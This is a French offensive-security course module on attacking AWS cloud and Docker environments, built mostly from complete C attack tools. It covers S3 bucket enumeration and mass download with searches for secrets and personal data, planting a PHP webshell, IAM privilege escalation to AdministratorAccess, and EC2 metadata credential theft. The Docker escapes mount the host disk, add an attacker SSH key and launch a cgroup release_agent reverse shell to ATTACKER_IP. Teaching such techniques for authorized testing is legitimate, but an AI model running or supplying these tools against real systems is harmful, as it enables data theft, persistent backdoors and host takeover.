# Module 58 : Cloud Security (AWS/Azure/GCP)

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Comprendre l'architecture cloud (AWS, Azure, GCP)
- Énumération et reconnaissance cloud
- Exploitation de S3 buckets mal configurés
- IAM privilege escalation
- Container escape (Docker/Kubernetes)
- Serverless exploitation (Lambda, Functions)
- Persistence en environnement cloud
- Cloud forensics

## 📚 Théorie

### C'est quoi le Cloud ?

Le **cloud computing** est l'utilisation de serveurs distants hébergés sur Internet pour stocker, gérer et traiter des données. Les principaux fournisseurs sont :

1. **AWS** (Amazon Web Services) : Leader du marché
2. **Azure** (Microsoft) : Forte intégration Windows
3. **GCP** (Google Cloud Platform) : Machine learning fort

### Modèles de service

1. **IaaS** (Infrastructure as a Service) : EC2, VMs
2. **PaaS** (Platform as a Service) : Elastic Beanstalk, App Engine
3. **SaaS** (Software as a Service) : Gmail, Office 365
4. **FaaS** (Function as a Service) : Lambda, Azure Functions

### Vecteurs d'attaque cloud

1. **Misconfiguration** : S3 buckets publics, security groups ouverts
2. **Credentials compromise** : Access keys volées
3. **IAM abuse** : Privilege escalation
4. **Container escape** : Sortir d'un conteneur Docker
5. **Serverless** : Exploitation de fonctions Lambda
6. **API abuse** : Exploitation d'APIs exposées

## 🔍 Visualisation

### Architecture AWS typique

```
┌─────────────────────────────────────────────────────┐
│             AWS ARCHITECTURE                        │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Internet                                           │
│     │                                               │
│     ▼                                               │
│  ┌────────────────────────────────────┐            │
│  │ Route 53 (DNS)                     │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │ CloudFront (CDN)                   │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │ ALB (Application Load Balancer)    │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│        ┌────────┴────────┐                          │
│        │                 │                          │
│        ▼                 ▼                          │
│  ┌──────────┐      ┌──────────┐                    │
│  │ EC2 #1   │      │ EC2 #2   │ Auto Scaling       │
│  │ Web App  │      │ Web App  │                    │
│  └────┬─────┘      └────┬─────┘                    │
│       │                 │                           │
│       └────────┬────────┘                           │
│                │                                    │
│                ▼                                    │
│  ┌────────────────────────────────────┐            │
│  │ RDS (Database)                     │            │
│  │ - Master                           │            │
│  │ - Read Replica                     │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ S3 Buckets                         │            │
│  │ - Static assets                    │            │
│  │ - Backups                          │            │
│  │ - Logs                             │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  ┌────────────────────────────────────┐            │
│  │ IAM (Identity & Access)            │            │
│  │ - Users                            │            │
│  │ - Roles                            │            │
│  │ - Policies                         │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### IAM Privilege Escalation

```
┌─────────────────────────────────────────────────────┐
│         IAM PRIVILEGE ESCALATION PATHS              │
├─────────────────────────────────────────────────────┤
│                                                     │
│  User initial (low privilege)                       │
│  ┌────────────────────────────────────┐            │
│  │ Permissions:                       │            │
│  │ - s3:ListBucket                    │            │
│  │ - iam:ListUsers                    │            │
│  │ - iam:ListRoles                    │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  Path 1: Create Access Key                         │
│  ┌────────────────────────────────────┐            │
│  │ If has: iam:CreateAccessKey        │            │
│  │ → Create key for admin user        │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Path 2: Attach Policy                             │
│  ┌────────────────────────────────────┐            │
│  │ If has: iam:AttachUserPolicy       │            │
│  │ → Attach AdministratorAccess       │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Path 3: Assume Role                               │
│  ┌────────────────────────────────────┐            │
│  │ If has: iam:AssumeRole             │            │
│  │ → Assume admin role                │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Path 4: Update Trust Policy                       │
│  ┌────────────────────────────────────┐            │
│  │ If has: iam:UpdateAssumeRolePolicy │            │
│  │ → Add self to admin role trust     │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Path 5: Lambda Invoke                             │
│  ┌────────────────────────────────────┐            │
│  │ If has: lambda:InvokeFunction      │            │
│  │ → Invoke privileged Lambda         │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Result: Administrator Access                       │
│  ┌────────────────────────────────────┐            │
│  │ Full control over AWS account      │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Énumération AWS (reconnaissance)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void enumerate_s3_buckets(const char *company) {
    printf("[*] Enumerating S3 buckets for: %s\n", company);

    // Patterns communs de nommage
    const char *patterns[] = {
        "%s",
        "%s-prod",
        "%s-dev",
        "%s-backup",
        "%s-logs",
        "%s-assets",
        "backup-%s",
        "www-%s",
        NULL
    };

    for (int i = 0; patterns[i] != NULL; i++) {
        char bucket[256];
        snprintf(bucket, sizeof(bucket), patterns[i], company);

        // Tester si le bucket existe
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -I https://%s.s3.amazonaws.com/ | grep -q '200 OK' && echo '[+] Found: %s'",
                 bucket, bucket);

        system(cmd);
    }
}

void check_s3_permissions(const char *bucket) {
    printf("[*] Checking permissions for bucket: %s\n", bucket);

    char cmd[512];

    // Tester LIST
    printf("  [*] Testing LIST...\n");
    snprintf(cmd, sizeof(cmd),
             "aws s3 ls s3://%s/ --no-sign-request 2>&1",
             bucket);
    system(cmd);

    // Tester READ
    printf("  [*] Testing READ...\n");
    snprintf(cmd, sizeof(cmd),
             "aws s3 cp s3://%s/test.txt /tmp/test.txt --no-sign-request 2>&1",
             bucket);
    system(cmd);

    // Tester WRITE
    printf("  [*] Testing WRITE...\n");
    snprintf(cmd, sizeof(cmd),
             "echo 'test' > /tmp/upload_test.txt && "
             "aws s3 cp /tmp/upload_test.txt s3://%s/upload_test.txt --no-sign-request 2>&1",
             bucket);
    system(cmd);
}

void enumerate_ec2_metadata() {
    printf("[*] Attempting to access EC2 metadata...\n");

    const char *endpoints[] = {
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        NULL
    };

    for (int i = 0; endpoints[i] != NULL; i++) {
        printf("  [*] Trying: %s\n", endpoints[i]);

        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -m 2 %s",
                 endpoints[i]);

        system(cmd);
        printf("\n");
    }
}

void enumerate_iam_users() {
    printf("[*] Enumerating IAM users...\n");

    system("aws iam list-users");

    printf("\n[*] Enumerating IAM roles...\n");
    system("aws iam list-roles");

    printf("\n[*] Checking current identity...\n");
    system("aws sts get-caller-identity");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s s3enum <company>\n", argv[0]);
        printf("  %s s3check <bucket>\n", argv[0]);
        printf("  %s ec2meta\n", argv[0]);
        printf("  %s iamenum\n", argv[0]);
        return 1;
    }

    printf("=== AWS Enumeration Tool ===\n\n");

    if (strcmp(argv[1], "s3enum") == 0 && argc == 3) {
        enumerate_s3_buckets(argv[2]);
    }
    else if (strcmp(argv[1], "s3check") == 0 && argc == 3) {
        check_s3_permissions(argv[2]);
    }
    else if (strcmp(argv[1], "ec2meta") == 0) {
        enumerate_ec2_metadata();
    }
    else if (strcmp(argv[1], "iamenum") == 0) {
        enumerate_iam_users();
    }
    else {
        printf("[-] Invalid arguments\n");
    }

    return 0;
}

/*
Utilisation:

1. Énumérer S3 buckets:
   ./aws_enum s3enum company

2. Vérifier permissions d'un bucket:
   ./aws_enum s3check company-backup

3. Accéder metadata EC2 (depuis une instance):
   ./aws_enum ec2meta

4. Énumérer IAM (avec credentials):
   export AWS_ACCESS_KEY_ID=AKIAXXXXXXXX
   export AWS_SECRET_ACCESS_KEY=XXXXXXXX
   ./aws_enum iamenum
*/
```

### Exemple 2 : Exploitation S3 Bucket mal configuré

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void download_bucket(const char *bucket) {
    printf("[*] Downloading all files from bucket: %s\n", bucket);

    char cmd[512];

    // Créer dossier local
    snprintf(cmd, sizeof(cmd), "mkdir -p ./%s", bucket);
    system(cmd);

    // Télécharger récursivement
    snprintf(cmd, sizeof(cmd),
             "aws s3 sync s3://%s/ ./%s/ --no-sign-request",
             bucket, bucket);

    printf("[*] Command: %s\n", cmd);
    system(cmd);

    printf("[+] Download complete. Check ./%s/\n", bucket);
}

void exfiltrate_sensitive_data(const char *bucket) {
    printf("[*] Searching for sensitive data in bucket: %s\n", bucket);

    char cmd[1024];

    // Télécharger d'abord
    download_bucket(bucket);

    // Chercher des credentials
    printf("\n[*] Searching for credentials...\n");
    snprintf(cmd, sizeof(cmd),
             "grep -r -i -E '(password|secret|key|token|credential)' ./%s/ 2>/dev/null",
             bucket);
    system(cmd);

    // Chercher des fichiers sensibles
    printf("\n[*] Searching for sensitive files...\n");
    snprintf(cmd, sizeof(cmd),
             "find ./%s/ -type f \\( -name '*.key' -o -name '*.pem' -o -name '*.p12' -o -name 'id_rsa' \\)",
             bucket);
    system(cmd);

    // Chercher des données PII
    printf("\n[*] Searching for PII (emails, SSN)...\n");
    snprintf(cmd, sizeof(cmd),
             "grep -r -E '[0-9]{3}-[0-9]{2}-[0-9]{4}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' ./%s/ 2>/dev/null | head -20",
             bucket);
    system(cmd);
}

void plant_webshell(const char *bucket) {
    printf("[*] Attempting to plant webshell in bucket: %s\n", bucket);

    // Créer un simple webshell PHP
    const char *webshell =
        "<?php\n"
        "if(isset($_GET['cmd'])) {\n"
        "    echo '<pre>';\n"
        "    system($_GET['cmd']);\n"
        "    echo '</pre>';\n"
        "}\n"
        "?>\n";

    // Écrire localement
    FILE *fp = fopen("/tmp/shell.php", "w");
    if (fp) {
        fprintf(fp, "%s", webshell);
        fclose(fp);
    }

    // Upload
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "aws s3 cp /tmp/shell.php s3://%s/shell.php --no-sign-request --acl public-read",
             bucket);

    printf("[*] Command: %s\n", cmd);
    system(cmd);

    printf("\n[+] If successful, access at:\n");
    printf("    https://%s.s3.amazonaws.com/shell.php?cmd=id\n", bucket);

    // Nettoyer
    unlink("/tmp/shell.php");
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage:\n");
        printf("  %s download <bucket>\n", argv[0]);
        printf("  %s exfil <bucket>\n", argv[0]);
        printf("  %s webshell <bucket>\n", argv[0]);
        return 1;
    }

    printf("=== S3 Exploitation Tool ===\n\n");

    if (strcmp(argv[1], "download") == 0) {
        download_bucket(argv[2]);
    }
    else if (strcmp(argv[1], "exfil") == 0) {
        exfiltrate_sensitive_data(argv[2]);
    }
    else if (strcmp(argv[1], "webshell") == 0) {
        plant_webshell(argv[2]);
    }
    else {
        printf("[-] Invalid command\n");
    }

    return 0;
}
```

### Exemple 3 : IAM Privilege Escalation

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void check_permissions() {
    printf("[*] Checking current IAM permissions...\n");

    // Qui suis-je?
    printf("\n[*] Current identity:\n");
    system("aws sts get-caller-identity");

    // Lister les policies attachées
    printf("\n[*] Attached policies:\n");
    system("aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)");
}

void escalate_attach_policy() {
    printf("[*] Attempting privilege escalation via AttachUserPolicy...\n");

    char cmd[512];

    // Obtenir le nom d'utilisateur actuel
    printf("[*] Getting current username...\n");
    system("aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2 > /tmp/username.txt");

    FILE *fp = fopen("/tmp/username.txt", "r");
    char username[128];
    if (fp) {
        fgets(username, sizeof(username), fp);
        username[strcspn(username, "\n")] = 0;
        fclose(fp);
    } else {
        return;
    }

    // Attacher AdministratorAccess
    printf("[*] Attaching AdministratorAccess policy...\n");
    snprintf(cmd, sizeof(cmd),
             "aws iam attach-user-policy --user-name %s --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
             username);

    printf("[*] Command: %s\n", cmd);
    system(cmd);

    printf("\n[+] If successful, you now have admin access!\n");
    printf("[*] Verifying...\n");

    check_permissions();
}

void escalate_create_access_key() {
    printf("[*] Attempting privilege escalation via CreateAccessKey...\n");

    // Lister les utilisateurs
    printf("[*] Listing IAM users...\n");
    system("aws iam list-users --query 'Users[].UserName' --output text");

    // Créer une clé pour un admin (si on a la permission)
    printf("\n[*] Creating access key for admin user...\n");

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "aws iam create-access-key --user-name admin-user");

    system(cmd);

    printf("\n[+] If successful, note the AccessKeyId and SecretAccessKey\n");
    printf("[+] Then configure:\n");
    printf("    export AWS_ACCESS_KEY_ID=AKIAXXXXXXXX\n");
    printf("    export AWS_SECRET_ACCESS_KEY=XXXXXXXX\n");
}

void escalate_assume_role() {
    printf("[*] Attempting privilege escalation via AssumeRole...\n");

    // Lister les rôles
    printf("[*] Listing IAM roles...\n");
    system("aws iam list-roles --query 'Roles[].RoleName' --output text");

    // Assumer un rôle admin
    printf("\n[*] Assuming admin role...\n");

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/admin-role --role-session-name exploit");

    system(cmd);

    printf("\n[+] If successful, extract credentials from output\n");
}

void enumerate_attack_surface() {
    printf("[*] Enumerating IAM attack surface...\n\n");

    // Check dangerous permissions
    const char *dangerous_perms[] = {
        "iam:AttachUserPolicy",
        "iam:CreateAccessKey",
        "iam:AssumeRole",
        "iam:UpdateAssumeRolePolicy",
        "lambda:InvokeFunction",
        "iam:PutUserPolicy",
        "iam:CreatePolicyVersion",
        "ec2:RunInstances",
        NULL
    };

    printf("[*] Checking for dangerous permissions:\n");

    for (int i = 0; dangerous_perms[i] != NULL; i++) {
        printf("  [ ] %s\n", dangerous_perms[i]);
    }

    printf("\n[*] Manual check required with:\n");
    printf("    aws iam get-user-policy --user-name <user> --policy-name <policy>\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s check\n", argv[0]);
        printf("  %s enum\n", argv[0]);
        printf("  %s attach\n", argv[0]);
        printf("  %s createkey\n", argv[0]);
        printf("  %s assumerole\n", argv[0]);
        return 1;
    }

    printf("=== IAM Privilege Escalation Tool ===\n\n");

    if (strcmp(argv[1], "check") == 0) {
        check_permissions();
    }
    else if (strcmp(argv[1], "enum") == 0) {
        enumerate_attack_surface();
    }
    else if (strcmp(argv[1], "attach") == 0) {
        escalate_attach_policy();
    }
    else if (strcmp(argv[1], "createkey") == 0) {
        escalate_create_access_key();
    }
    else if (strcmp(argv[1], "assumerole") == 0) {
        escalate_assume_role();
    }
    else {
        printf("[-] Invalid command\n");
    }

    return 0;
}
```

### Exemple 4 : Container Escape (Docker)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

void check_container() {
    printf("[*] Checking if running in a container...\n");

    // Check /.dockerenv
    if (access("/.dockerenv", F_OK) == 0) {
        printf("[+] /.dockerenv found - likely Docker container\n");
    }

    // Check cgroup
    FILE *fp = fopen("/proc/1/cgroup", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "docker") || strstr(line, "lxc")) {
                printf("[+] Docker/LXC found in cgroup\n");
                break;
            }
        }
        fclose(fp);
    }

    // Check capabilities
    printf("\n[*] Current capabilities:\n");
    system("cat /proc/self/status | grep Cap");
}

void escape_privileged_mount() {
    printf("[*] Attempting privileged mount escape...\n");

    // Vérifier si on est privileged
    struct stat st;
    if (stat("/dev/sda", &st) != 0) {
        printf("[-] /dev/sda not accessible - not privileged\n");
        return;
    }

    printf("[+] Access to /dev/sda - container is privileged!\n");

    // Monter le filesystem hôte
    system("mkdir -p /mnt/host");
    system("mount /dev/sda1 /mnt/host");

    printf("[+] Host filesystem mounted at /mnt/host\n");

    // Ajouter une backdoor dans /root/.ssh/authorized_keys de l'hôte
    printf("[*] Installing SSH backdoor on host...\n");

    FILE *fp = fopen("/mnt/host/root/.ssh/authorized_keys", "a");
    if (fp) {
        fprintf(fp, "ssh-rsa AAAAB3NzaC1... attacker@evil\n");
        fclose(fp);

        printf("[+] SSH key added to host root account\n");
    }
}

void escape_docker_socket() {
    printf("[*] Attempting Docker socket escape...\n");

    // Vérifier si docker.sock est monté
    if (access("/var/run/docker.sock", F_OK) != 0) {
        printf("[-] /var/run/docker.sock not found\n");
        return;
    }

    printf("[+] Docker socket found!\n");

    // Créer un container privileged qui monte l'hôte
    printf("[*] Creating privileged container...\n");

    const char *escape_cmd =
        "docker run -it --rm --privileged "
        "-v /:/host "
        "alpine chroot /host /bin/bash";

    printf("[*] Command: %s\n", escape_cmd);
    printf("[!] This will give you a root shell on the host\n");
}

void escape_cgroup_release_agent() {
    printf("[*] Attempting cgroup release_agent escape...\n");

    // Créer un cgroup
    system("mkdir /tmp/cgrp");
    system("mount -t cgroup -o memory cgroup /tmp/cgrp");
    system("mkdir /tmp/cgrp/x");

    // Activer release_agent
    system("echo 1 > /tmp/cgrp/x/notify_on_release");

    // Payload reverse shell
    const char *payload = "#!/bin/sh\n"
                          "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n";

    FILE *fp = fopen("/tmp/payload.sh", "w");
    if (fp) {
        fprintf(fp, "%s", payload);
        fclose(fp);
        chmod("/tmp/payload.sh", 0755);
    }

    // Définir release_agent
    system("echo '/tmp/payload.sh' > /tmp/cgrp/release_agent");

    // Trigger
    system("sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'");

    printf("[+] Exploit triggered. Check for reverse shell.\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s check\n", argv[0]);
        printf("  %s mount\n", argv[0]);
        printf("  %s socket\n", argv[0]);
        printf("  %s cgroup\n", argv[0]);
        return 1;
    }

    printf("=== Docker Escape Tool ===\n\n");

    if (strcmp(argv[1], "check") == 0) {
        check_container();
    }
    else if (strcmp(argv[1], "mount") == 0) {
        escape_privileged_mount();
    }
    else if (strcmp(argv[1], "socket") == 0) {
        escape_docker_socket();
    }
    else if (strcmp(argv[1], "cgroup") == 0) {
        escape_cgroup_release_agent();
    }
    else {
        printf("[-] Invalid command\n");
    }

    return 0;
}
```

## 📝 Points clés à retenir

1. **S3** : Vérifier permissions (public/authenticated)
2. **IAM** : Chercher permissions dangereuses (AttachPolicy, CreateKey)
3. **EC2 Metadata** : 169.254.169.254 pour credentials
4. **Container** : Privileged, docker.sock, cgroup escape
5. **Enumeration** : Toujours commencer par énumération

### Checklist Cloud Security

```
Phase              Actions                            Outil
──────────────────────────────────────────────────────────────────
Reconnaissance    - Enum S3 buckets                  aws-cli, s3scanner
                  - DNS enum (Route53)               dig, nslookup
                  - OSINT (Shodan)                   shodan

Access            - Stolen keys                       -
                  - SSRF → metadata                   curl
                  - Phishing                          -

Privilege Esc     - IAM escalation                   aws-cli, pacu
                  - Assume roles                      -

Persistence       - Lambda backdoors                  -
                  - IAM users                         -
                  - Snapshot copying                  -

Exfiltration      - S3 sync                           aws s3 sync
                  - RDS snapshots                     -
```

### Outils cloud

- **pacu** : Framework AWS exploitation
- **ScoutSuite** : Multi-cloud auditing
- **CloudGoat** : Vulnerable AWS environment
- **Prowler** : AWS security assessment

## ➡️ Prochaine étape

Maintenant que tu maîtrises le cloud security, tu es prêt pour le **Module 59 : Red Team Operations**, où tu apprendras les méthodologies complètes d'engagement Red Team, de la reconnaissance à la post-exploitation.

### Ce que tu as appris
- Énumération cloud (AWS/Azure/GCP)
- Exploitation S3 buckets
- IAM privilege escalation
- Container escape (Docker)
- Metadata exploitation

### Ce qui t'attend
- Méthodologie Red Team complète
- OSINT et reconnaissance
- Phishing et social engineering
- Post-exploitation avancée
- Reporting et documentation
- Engagement rules et éthique
